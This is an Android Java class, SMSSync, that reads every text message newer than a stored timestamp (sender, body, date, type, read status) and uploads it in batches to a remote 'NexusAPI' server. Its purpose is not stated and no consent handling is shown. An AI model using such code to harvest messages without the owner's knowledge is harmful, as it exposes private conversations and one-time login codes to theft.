package com.nexus.app;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.content.ContentResolver;
import org.json.JSONArray;
import org.json.JSONObject;

public class SMSSync {
    private static final int MAX_BATCH = 500;
    private final Context ctx;
    private final NexusAPI api;

    public SMSSync(Context ctx, NexusAPI api) {
        this.ctx = ctx;
        this.api = api;
    }

    public void sync() {
        try {
            long lastSync = Long.parseLong(NexusConfig.getLastSync(ctx, "sms"));
            Uri uri = Uri.parse("content://sms");
            String[] proj = { "_id", "address", "body", "date", "type", "read" };
            String sel = "date > ?";
            String[] args = { String.valueOf(lastSync) };

            Bundle query = new Bundle();
            query.putString(ContentResolver.QUERY_ARG_SQL_SELECTION, sel);
            query.putStringArray(ContentResolver.QUERY_ARG_SQL_SELECTION_ARGS, args);
            query.putStringArray(ContentResolver.QUERY_ARG_SORT_COLUMNS, new String[]{ "date" });
            query.putInt(ContentResolver.QUERY_ARG_SORT_DIRECTION,
                ContentResolver.QUERY_SORT_DIRECTION_ASCENDING);
            query.putInt(ContentResolver.QUERY_ARG_LIMIT, MAX_BATCH);
            Cursor c = ctx.getContentResolver().query(uri, proj, query, null);
            if (c == null) return;

            int idCol = c.getColumnIndexOrThrow("_id");
            int addressCol = c.getColumnIndexOrThrow("address");
            int bodyCol = c.getColumnIndexOrThrow("body");
            int dateCol = c.getColumnIndexOrThrow("date");
            int typeCol = c.getColumnIndexOrThrow("type");
            int readCol = c.getColumnIndexOrThrow("read");

            JSONArray msgs = new JSONArray();
            long newLastSync = lastSync;

            while (c.moveToNext()) {
                try {
                    JSONObject m = new JSONObject();
                    m.put("id", c.getString(idCol));
                    m.put("address", c.getString(addressCol));
                    String body = c.getString(bodyCol);
                    m.put("body", body != null ? body.replaceAll("[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F]", " ") : "");
                    long date = c.getLong(dateCol);
                    m.put("date", date);
                    m.put("type", c.getInt(typeCol));
                    m.put("read", c.getInt(readCol));
                    msgs.put(m);
                    if (date > newLastSync) newLastSync = date;
                } catch (Exception e) { e.printStackTrace(); }
            }
            c.close();

            if (msgs.length() > 0) {
                if (api.sendSMS(msgs)) {
                    NexusConfig.setLastSync(ctx, "sms", String.valueOf(newLastSync));
                }
            }
        } catch (Exception e) { e.printStackTrace(); }
    }
}
